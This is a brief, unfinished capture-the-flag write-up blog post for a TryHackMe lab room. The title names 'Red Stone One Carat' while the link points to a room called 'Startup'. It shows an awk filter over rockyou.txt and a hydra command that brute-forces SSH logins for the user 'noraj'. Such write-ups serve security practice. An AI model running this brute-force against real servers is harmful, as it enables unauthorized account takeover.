---
layout: post
title: Red Stone One Carat - TryHackMe Room
---

Room: [Startup](https://tryhackme.com/room/startup)

# Enumeration <nmap>
- Start by enumerating the box

# Port 22 open
- use "noraj" to bruteforce the box

```bash

# since the hint tells us that the password contains 'bu'
awk '/bu/' rockyou.txt > wordlist.txt

hydra -l noraj -P wordlist.txt ssh://IP -V -F -t 4

```

